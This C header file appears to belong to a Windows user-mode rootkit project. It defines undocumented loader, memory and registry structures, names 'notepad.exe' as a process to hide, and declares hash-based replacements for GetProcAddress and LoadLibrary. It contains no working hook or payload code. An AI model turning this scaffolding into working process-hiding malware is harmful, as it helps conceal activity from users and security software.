#ifndef _rku_h
#define _rku_h

#include "winhook.h"
#include <Windows.h>

#include <stdio.h>
// #include <dbgeng.h>
// #include <ntifs.h>

#define HIDE_ME "notepad.exe"
#define LHIDE_ME L"notepad.exe"

typedef struct _MY_LDR_DATA_TABLE_ENTRY
{
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING ignored;
    ULONG Flags;
    SHORT LoadCount;
    SHORT TlsIndex;
    LIST_ENTRY HashTableEntry;
    ULONG TimeDateStamp;
} MY_LDR_DATA_TABLE_ENTRY;

typedef struct _MMVAD_FLAGS
{
    ULONG CommitCharge : 19;
    ULONG NoChange : 1;
    ULONG VadType : 3;
    ULONG MemCommit : 1;
    ULONG Protection : 5;
    ULONG Spare : 2;
    ULONG PrivateMemory : 1;
} MMVAD_FLAGS, *PMMVAD_FLAGS;
typedef struct _MMVAD_FLAGS2
{
    ULONG FileOffset : 24;
    ULONG SecNoChange : 1;
    ULONG OneSecured : 1;
    ULONG MultipleSecured : 1;
    ULONG Spare : 1;
    ULONG LongVad : 1;
    ULONG ExtendableFile : 1;
    ULONG Inherit : 1;
    ULONG CopyOnWrite : 1;
} MMVAD_FLAGS2, *PMMVAD_FLAGS2;
typedef struct MMVAD
{
    /*0x000*/ ULONG32 StartingVpn;
    /*0x004*/ ULONG32 EndingVpn;
    /*0x008*/ struct _MMVAD *Parent;
    /*0x00C*/ struct _MMVAD *LeftChild;
    /*0x010*/ struct _MMVAD *RightChild;
    union
    {
        /*0x014*/ ULONG32 LongFlags;
        /*0x014*/ struct _MMVAD_FLAGS VadFlags;
    } u;
    /*0x018*/ struct _CONTROL_AREA *ControlArea;
    /*0x01C*/ struct _MMPTE *FirstPrototypePte;
    /*0x020*/ struct _MMPTE *LastContiguousPte;
    union
    {
        /*0x024*/ ULONG32 LongFlags2;
        /*0x024*/ struct _MMVAD_FLAGS2 VadFlags2;
    } u2;
} MMVAD, *PMMVAD;

typedef struct _RTL_PROCESS_MODULE_INFORMATION

{
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef enum _KEY_INFORMATION_CLASS {
  KeyBasicInformation,
  KeyNodeInformation,
  KeyFullInformation,
  KeyNameInformation,
  KeyCachedInformation,
  KeyFlagsInformation,
  KeyVirtualizationInformation,
  KeyHandleTagsInformation,
  KeyTrustInformation,
  KeyLayerInformation,
  MaxKeyInfoClass
} KEY_INFORMATION_CLASS;

typedef enum _KEY_VALUE_INFORMATION_CLASS {
  KeyValueBasicInformation,
  KeyValueFullInformation,
  KeyValuePartialInformation,
  KeyValueFullInformationAlign64,
  KeyValuePartialInformationAlign64,
  KeyValueLayerInformation,
  MaxKeyValueInfoClass
} KEY_VALUE_INFORMATION_CLASS;

typedef struct _KEY_VALUE_BASIC_INFORMATION {
  ULONG TitleIndex;
  ULONG Type;
  ULONG NameLength;
  WCHAR Name[1];
} KEY_VALUE_BASIC_INFORMATION, *PKEY_VALUE_BASIC_INFORMATION;

typedef struct _KEY_VALUE_FULL_INFORMATION {
  ULONG TitleIndex;
  ULONG Type;
  ULONG DataOffset;
  ULONG DataLength;
  ULONG NameLength;
  WCHAR Name[1];
} KEY_VALUE_FULL_INFORMATION, *PKEY_VALUE_FULL_INFORMATION;

typedef struct _KEY_BASIC_INFORMATION {
  LARGE_INTEGER LastWriteTime;
  ULONG         TitleIndex;
  ULONG         NameLength;
  WCHAR         Name[1];
} KEY_BASIC_INFORMATION, *PKEY_BASIC_INFORMATION;

typedef struct _KEY_NODE_INFORMATION {
  LARGE_INTEGER LastWriteTime;
  ULONG         TitleIndex;
  ULONG         ClassOffset;
  ULONG         ClassLength;
  ULONG         NameLength;
  WCHAR         Name[1];
} KEY_NODE_INFORMATION, *PKEY_NODE_INFORMATION;

typedef struct _KEY_NAME_INFORMATION {
  ULONG NameLength;
  WCHAR Name[1];
} KEY_NAME_INFORMATION, *PKEY_NAME_INFORMATION;




typedef struct _RTL_PROCESS_MODULES
{
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

typedef LONG (*fpReadVirtual)(ULONG64 Offset,PVOID Buffer,ULONG BufferSize,PULONG BytesRead) PURE;
#define ReadVirtual(base, offset, buffer, size) memcpy(buffer, base + offset, size)
typedef NTSTATUS(NTAPI *fpNtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength);


#define SystemModuleInformation 0x0b
#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004

unsigned int crc32s(const wchar_t *message);
unsigned int crc32c(const unsigned char *message);
int custom_wcscmp(const wchar_t *str1, const wchar_t *str2);
int custom_strcmp(const char *str1, const char *str2);
int custom_ucscmp(const wchar_t* str1,int len1, const wchar_t* str2, int len2);
FARPROC _GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
HMODULE _GetModuleHandle(LPCWSTR lModuleName);
FARPROC _GetProcAddressNative(LPCSTR lpProcName);

typedef VOID (NTAPI*pRtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
typedef NTSTATUS(NTAPI* pLdrLoadDll) (
    PWCHAR PathToFile,
    ULONG Flags,
    PUNICODE_STRING ModuleFileName,
    PHANDLE ModuleHandle
    );
HMODULE _LoadLibrary(LPCWSTR lpFileName);

#endif